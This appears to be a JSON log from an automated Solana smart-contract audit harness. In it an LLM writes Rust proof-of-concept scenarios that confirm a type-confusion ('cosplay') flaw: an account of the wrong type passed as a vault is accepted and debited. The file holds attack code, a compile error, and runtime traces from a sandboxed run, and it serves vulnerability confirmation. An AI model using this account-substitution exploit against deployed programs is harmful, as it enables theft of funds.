@@ -1,0 +1,160 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: saldo da conta de outro tipo foi debitado de 1000 para 500; recipient recebeu lamports da conta de outro tipo",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2679,
+        "completion_tokens": 1067,
+        "latency_s": 5.24
+      },
+      "raw": "{\n  \"plan\": \"O ataque COSPLAY explora a desserializacao manual do vault por offsets fixos (8..40 autoridade, 40..48 saldo) sem validar discriminador. Preparamos uma conta legitima de vault com discriminador correto e autoridade/saldo validos, e uma conta de outro tipo (ex.: config) cujo layout nos offsets 8..40 e 40..48 coincida com a autoridade e um saldo suficiente. O baseline chama withdraw com o vault legitimo (deve ter sucesso). O ataque chama withdraw passando a conta de outro tipo no lugar do vault; se o programa aceitar, ele debita lamports da conta errada e grava o novo saldo nos offsets 40..48 da conta de outro tipo, demonstrando o dano.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\n// Conta legitima de vault: discriminador (8 bytes) + autoridade (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[0..8].copy_from_slice(&[1u8; 8]);\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nlet vault = account(&env.program_id, &vault_data, Some(10_000_000));\\n\\n// Conta de OUTRO tipo (config): discriminador diferente, mas offsets 8..40 e 40..48\\n// coincidem com autoridade e saldo esperados pelo withdraw.\\nlet mut config_data = vec![0u8; 48];\\nconfig_data[0..8].copy_from_slice(&[2u8; 8]); // discriminador diferente do vault\\nconfig_data[8..40].copy_from_slice(authority.as_ref());\\nconfig_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nlet config = account(&env.program_id, &config_data, Some(10_000_000));\\n\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet amount: u64 = 500;\\nlet mut ix_data = vec![1u8]; // IX_WITHDRAW\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: withdraw com o vault legitimo\\nlet metas_ok = vec![\\n    AccountMeta::new(vault_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\nlet ix_ok = env.raw_ix(&ix_data, metas_ok);\\nlet contas_ok = vec![\\n    (vault_key, vault.clone()),\\n    (authority, wallet(1_000_000)),\\n    (recipient, recipient_acc.clone()),\\n];\\nlet r_ok = env.baseline(\\\"withdraw legitimo do vault\\\", &ix_ok, &contas_ok);\\n\\n// Ataque: withdraw passando a conta de outro tipo (config) no lugar do vault\\nlet metas_atk = vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\nlet ix_atk = env.raw_ix(&ix_data, metas_atk);\\nlet contas_atk = vec![\\n    (config_key, config.clone()),\\n    (authority, wallet(1_000_000)),\\n    (recipient, recipient_acc.clone()),\\n];\\nlet r = env.attack(\\\"withdraw usando conta de outro tipo como vault\\\", &ix_atk, &contas_atk);\\n\\nif r.program_result == ProgramResult::Success {\\n    // Dano: o saldo da conta de outro tipo foi debitado (500) e o recipient recebeu lamports\\n    let config_after = after(&r, &config_key);\\n    let recipient_after = after(&r, &recipient);\\n    let saldo_config = read_u64(config_after.data(), 40);\\n    env.effect(\\n        \\\"saldo da conta de outro tipo foi debitado de 1000 para 500\\\",\\n        saldo_config == 500,\\n    );\\n    env.effect(\\n        \\\"recipient recebeu lamports da conta de outro tipo\\\",\\n        recipient_after.lamports() > recipient_acc.lamports(),\\n    );\\n}\\n\"\n}",
+      "plan": "O ataque COSPLAY explora a desserializacao manual do vault por offsets fixos (8..40 autoridade, 40..48 saldo) sem validar discriminador. Preparamos uma conta legitima de vault com discriminador correto e autoridade/saldo validos, e uma conta de outro tipo (ex.: config) cujo layout nos offsets 8..40 e 40..48 coincida com a autoridade e um saldo suficiente. O baseline chama withdraw com o vault legitimo (deve ter sucesso). O ataque chama withdraw passando a conta de outro tipo no lugar do vault; se o programa aceitar, ele debita lamports da conta errada e grava o novo saldo nos offsets 40..48 da conta de outro tipo, demonstrando o dano.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\n// Conta legitima de vault: discriminador (8 bytes) + autoridade (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[0..8].copy_from_slice(&[1u8; 8]);\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nlet vault = account(&env.program_id, &vault_data, Some(10_000_000));\n\n// Conta de OUTRO tipo (config): discriminador diferente, mas offsets 8..40 e 40..48\n// coincidem com autoridade e saldo esperados pelo withdraw.\nlet mut config_data = vec![0u8; 48];\nconfig_data[0..8].copy_from_slice(&[2u8; 8]); // discriminador diferente do vault\nconfig_data[8..40].copy_from_slice(authority.as_ref());\nconfig_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nlet config = account(&env.program_id, &config_data, Some(10_000_000));\n\nlet recipient_acc = wallet(1_000_000);\n\nlet amount: u64 = 500;\nlet mut ix_data = vec![1u8]; // IX_WITHDRAW\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: withdraw com o vault legitimo\nlet metas_ok = vec![\n    AccountMeta::new(vault_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\nlet ix_ok = env.raw_ix(&ix_data, metas_ok);\nlet contas_ok = vec![\n    (vault_key, vault.clone()),\n    (authority, wallet(1_000_000)),\n    (recipient, recipient_acc.clone()),\n];\nlet r_ok = env.baseline(\"withdraw legitimo do vault\", &ix_ok, &contas_ok);\n\n// Ataque: withdraw passando a conta de outro tipo (config) no lugar do vault\nlet metas_atk = vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\nlet ix_atk = env.raw_ix(&ix_data, metas_atk);\nlet contas_atk = vec![\n    (config_key, config.clone()),\n    (authority, wallet(1_000_000)),\n    (recipient, recipient_acc.clone()),\n];\nlet r = env.attack(\"withdraw usando conta de outro tipo como vault\", &ix_atk, &contas_atk);\n\nif r.program_result == ProgramResult::Success {\n    // Dano: o saldo da conta de outro tipo foi debitado (500) e o recipient recebeu lamports\n    let config_after = after(&r, &config_key);\n    let recipient_after = after(&r, &recipient);\n    let saldo_config = read_u64(config_after.data(), 40);\n    env.effect(\n        \"saldo da conta de outro tipo foi debitado de 1000 para 500\",\n        saldo_config == 500,\n    );\n    env.effect(\n        \"recipient recebeu lamports da conta de outro tipo\",\n        recipient_after.lamports() > recipient_acc.lamports(),\n    );\n}\n",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:35:26\n   |\n35 |         AccountMeta::new(vault_key, false),\n   |                          ^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:41:10\n   |\n41 |         (vault_key, vault.clone()),\n   |          ^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:49:26\n   |\n49 |         AccountMeta::new(config_key, false),\n   |                          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:55:10\n   |\n55 |         (config_key, config.clone()),\n   |          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:63:39\n   |\n63 |         let config_after = after(&r, &config_key);\n   |                                       ^^^^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 5 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:35:26\n   |\n35 |         AccountMeta::new(vault_key, false),\n   |                          ^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `vault_key` in this scope\n  --> tests/attempt.rs:41:10\n   |\n41 |         (vault_key, vault.clone()),\n   |          ^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:49:26\n   |\n49 |         AccountMeta::new(config_key, false),\n   |                          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:55:10\n   |\n55 |         (config_key, config.clone()),\n   |          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:63:39\n   |\n63 |         let config_after = after(&r, &config_key);\n   |                                       ^^^^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 5 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3831,
+        "completion_tokens": 1063,
+        "latency_s": 4.36
+      },
+      "raw": "{\"plan\": \"Preparo duas contas com o mesmo layout de 48 bytes: um vault legitimo (discriminador 1) e uma conta de outro tipo (discriminador 2), ambas com autoridade e saldo nos offsets 8..40 e 40..48. O baseline executa withdraw com o vault legitimo e deve ter sucesso. O ataque executa a mesma instrucao passando a conta de outro tipo no lugar do vault; se aceita, o saldo dessa conta e debitado e o recipient recebe lamports, demonstrando o cosplay. Corrijo os erros de compilacao definindo as chaves das contas (vault_key, config_key) antes de usa-las.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\nlet vault_key = Pubkey::new_unique();\\nlet config_key = Pubkey::new_unique();\\n\\n// Conta legitima de vault: discriminador (8 bytes) + autoridade (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[0..8].copy_from_slice(&[1u8; 8]);\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nlet vault = account(&env.program_id, &vault_data, Some(10_000_000));\\n\\n// Conta de OUTRO tipo (config): discriminador diferente, mas offsets 8..40 e 40..48\\n// coincidem com autoridade e saldo esperados pelo withdraw.\\nlet mut config_data = vec![0u8; 48];\\nconfig_data[0..8].copy_from_slice(&[2u8; 8]); // discriminador diferente do vault\\nconfig_data[8..40].copy_from_slice(authority.as_ref());\\nconfig_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nlet config = account(&env.program_id, &config_data, Some(10_000_000));\\n\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet amount: u64 = 500;\\nlet mut ix_data = vec![1u8]; // IX_WITHDRAW\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: withdraw com o vault legitimo\\nlet metas_ok = vec![\\n    AccountMeta::new(vault_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\nlet ix_ok = env.raw_ix(&ix_data, metas_ok);\\nlet contas_ok = vec![\\n    (vault_key, vault.clone()),\\n    (authority, wallet(1_000_000)),\\n    (recipient, recipient_acc.clone()),\\n];\\nlet r_ok = env.baseline(\\\"withdraw legitimo do vault\\\", &ix_ok, &contas_ok);\\n\\n// Ataque: withdraw passando a conta de outro tipo (config) no lugar do vault\\nlet metas_atk = vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\nlet ix_atk = env.raw_ix(&ix_data, metas_atk);\\nlet contas_atk = vec![\\n    (config_key, config.clone()),\\n    (authority, wallet(1_000_000)),\\n    (recipient, recipient_acc.clone()),\\n];\\nlet r = env.attack(\\\"withdraw usando conta de outro tipo como vault\\\", &ix_atk, &contas_atk);\\n\\nif r.program_result == ProgramResult::Success {\\n    // Dano: o saldo da conta de outro tipo foi debitado (500) e o recipient recebeu lamports\\n    let config_after = after(&r, &config_key);\\n    let recipient_after = after(&r, &recipient);\\n    let saldo_config = read_u64(config_after.data(), 40);\\n    env.effect(\\n        \\\"saldo da conta de outro tipo foi debitado de 1000 para 500\\\",\\n        saldo_config == 500,\\n    );\\n    env.effect(\\n        \\\"recipient recebeu lamports da conta de outro tipo\\\",\\n        recipient_after.lamports() > recipient_acc.lamports(),\\n    );\\n}\\n\"}",
+      "plan": "Preparo duas contas com o mesmo layout de 48 bytes: um vault legitimo (discriminador 1) e uma conta de outro tipo (discriminador 2), ambas com autoridade e saldo nos offsets 8..40 e 40..48. O baseline executa withdraw com o vault legitimo e deve ter sucesso. O ataque executa a mesma instrucao passando a conta de outro tipo no lugar do vault; se aceita, o saldo dessa conta e debitado e o recipient recebe lamports, demonstrando o cosplay. Corrijo os erros de compilacao definindo as chaves das contas (vault_key, config_key) antes de usa-las.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\nlet vault_key = Pubkey::new_unique();\nlet config_key = Pubkey::new_unique();\n\n// Conta legitima de vault: discriminador (8 bytes) + autoridade (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[0..8].copy_from_slice(&[1u8; 8]);\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nlet vault = account(&env.program_id, &vault_data, Some(10_000_000));\n\n// Conta de OUTRO tipo (config): discriminador diferente, mas offsets 8..40 e 40..48\n// coincidem com autoridade e saldo esperados pelo withdraw.\nlet mut config_data = vec![0u8; 48];\nconfig_data[0..8].copy_from_slice(&[2u8; 8]); // discriminador diferente do vault\nconfig_data[8..40].copy_from_slice(authority.as_ref());\nconfig_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nlet config = account(&env.program_id, &config_data, Some(10_000_000));\n\nlet recipient_acc = wallet(1_000_000);\n\nlet amount: u64 = 500;\nlet mut ix_data = vec![1u8]; // IX_WITHDRAW\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: withdraw com o vault legitimo\nlet metas_ok = vec![\n    AccountMeta::new(vault_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\nlet ix_ok = env.raw_ix(&ix_data, metas_ok);\nlet contas_ok = vec![\n    (vault_key, vault.clone()),\n    (authority, wallet(1_000_000)),\n    (recipient, recipient_acc.clone()),\n];\nlet r_ok = env.baseline(\"withdraw legitimo do vault\", &ix_ok, &contas_ok);\n\n// Ataque: withdraw passando a conta de outro tipo (config) no lugar do vault\nlet metas_atk = vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\nlet ix_atk = env.raw_ix(&ix_data, metas_atk);\nlet contas_atk = vec![\n    (config_key, config.clone()),\n    (authority, wallet(1_000_000)),\n    (recipient, recipient_acc.clone()),\n];\nlet r = env.attack(\"withdraw usando conta de outro tipo como vault\", &ix_atk, &contas_atk);\n\nif r.program_result == ProgramResult::Success {\n    // Dano: o saldo da conta de outro tipo foi debitado (500) e o recipient recebeu lamports\n    let config_after = after(&r, &config_key);\n    let recipient_after = after(&r, &recipient);\n    let saldo_config = read_u64(config_after.data(), 40);\n    env.effect(\n        \"saldo da conta de outro tipo foi debitado de 1000 para 500\",\n        saldo_config == 500,\n    );\n    env.effect(\n        \"recipient recebeu lamports da conta de outro tipo\",\n        recipient_after.lamports() > recipient_acc.lamports(),\n    );\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "withdraw legitimo do vault",
+            "result": "Success",
+            "compute_units": 391,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "01f4010000000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0101010101010101",
+                "digest": "99ca025f3d81bb4b",
+                "post": "01010101010101010000000000000002000000000000000000000000000000000000000000000000f401000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "withdraw usando conta de outro tipo como vault",
+            "result": "Success",
+            "compute_units": 391,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "01f4010000000000",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0202020202020202",
+                "digest": "b5fb3cc2ff79a1ff",
+                "post": "02020202020202020000000000000002000000000000000000000000000000000000000000000000f401000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "saldo da conta de outro tipo foi debitado de 1000 para 500",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "recipient recebeu lamports da conta de outro tipo",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 391 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 391 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: saldo da conta de outro tipo foi debitado de 1000 para 500; recipient recebeu lamports da conta de outro tipo"
+    }
+  ],
+  "case_id": "SSP-01-P-S",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let vault_data = vault.try_borrow_data()?;\nlet stored_authority = read_pubkey(&vault_data[8..40]);\nlet balance = u64::from_le_bytes(vault_data[40..48].try_into()...);",
+    "explanation": "Os dados da conta `vault` sao desserializados manualmente por offsets fixos (8..40 para autoridade, 40..48 para saldo) sem validar nenhum discriminador/tag de tipo no inicio do buffer. Uma conta de outro tipo com layout compativel poderia ser passada como vault e interpretada incorretamente.",
+    "attack_hypothesis": "O atacante fornece uma conta de um tipo diferente (por exemplo, uma conta de configuracao ou de outro usuario) cujo layout de bytes nos offsets 8..40 e 40..48 coincida com os campos esperados, fazendo o programa tratar dados de outro tipo como um vault valido."
+  }
+}
